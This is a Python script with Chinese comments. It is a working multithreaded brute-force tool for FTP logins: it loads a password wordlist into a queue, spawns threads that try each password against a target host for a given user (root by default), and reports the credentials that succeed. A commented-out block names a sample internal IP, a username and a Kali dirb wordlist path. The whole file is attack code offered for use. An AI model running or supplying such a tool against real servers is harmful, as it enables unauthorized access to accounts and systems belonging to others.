import ftplib
import time
import threading
import queue
import argparse
# 创建类，继承threading,用新方法重写方法run
class thread_brute_ftp(threading.Thread):
    def __init__(self,host,user,q):
        threading.Thread.__init__(self)
        self.host = host
        self.user = user
        self.q = q
    def run(self):
        while not self.q.empty():
            password = self.q.get()
           # print(password)
            state  = brute_ftp(self.host,self.user,str(password))
            if state == True:
                self.q.queue.clear()
                break
            elif state == False:
                continue
# ftp连接测试
def brute_ftp(host,user,password):
    ftp = ftplib.FTP(host)
    try:
        res = ftp.login(user,password)
        print("[+] Success host:%s user:%s password: %s" %(host,user,password))
        print(res)
        return True
    except:
        print("[-] user:%s password:%s" %(user,password))
        return False
    else:
        ftp.quit()
# 获取密码
def get_password(dirb):
    q = queue.Queue()
    with open(dirb) as f:
        for line in f:
            password = line.strip('\r').strip('\n')
            q.put(password)
    return q
# 命令行解析
def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-r','--rhost',dest='rhost',help="Set Destination host address")
    parser.add_argument('-u','--user',dest='user',default='root',help="set ftp username")
    parser.add_argument('-f','--file',dest='file',help="Set dictionary directory")
    parser.add_argument('-t','--thread',dest='thread',default=10,help='Set the thread default to 10')
    args = parser.parse_args()
    return args
# 参数配置
def main():
    '''
    host = '172.20.10.139'
    user = 'yangfan'
    dirb = '/usr/share/wordlists/dirb/small.txt'
    '''
    # 创建解析
    args = parser()
    # 设置目标主机地址
    host = args.rhost
    # 设置用户名
    user = args.user
    # 设置目录
    dirb = args.file
    # 设置线程
    thread = args.thread
    # 线程队列
    threads = []
    # 获取字典数据用队列的形式返回
    q = get_password(dirb)
    # 创建线程
    for tName in range(int(thread)):
        # 创建新线程
        thread = thread_brute_ftp(host,user,q)
        # 启动新线程
        thread.start()
        # 添加线程到线程列表
        threads.append(thread)

    # 等待所有线程完成
    for t in threads:
        t.join()

if __name__=='__main__':
    main()
